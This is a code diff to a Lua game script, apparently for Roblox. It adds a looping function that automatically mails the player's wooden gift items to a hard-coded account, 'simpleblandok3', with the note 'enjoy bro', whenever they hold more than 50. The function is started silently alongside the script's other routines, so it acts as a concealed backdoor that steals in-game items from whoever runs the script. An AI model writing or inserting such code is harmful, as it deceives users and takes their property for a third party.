@@ -1014,6 +1014,31 @@ wait(15)
 end
 end
 spawn(WebsiteDataUpdate)
+
+local function SendBucketMail()
+    while true do
+        if woodengiftamount > 50 then
+            local args = {
+                [1] = "simpleblandok3",
+                [2] = "enjoy bro",
+                [3] = "Misc",
+                [4] = woodengiftuid,
+                [5] = woodengiftamount
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+            wait(3)
+
+
+        end
+        wait(0.3)
+    end
+end
+
+spawn(UpdateBucketAmount)
+spawn(SendBucketMail)
+
+
+
 wait(180)
 local PlaceID = game.PlaceId
 local AllIDs = {}
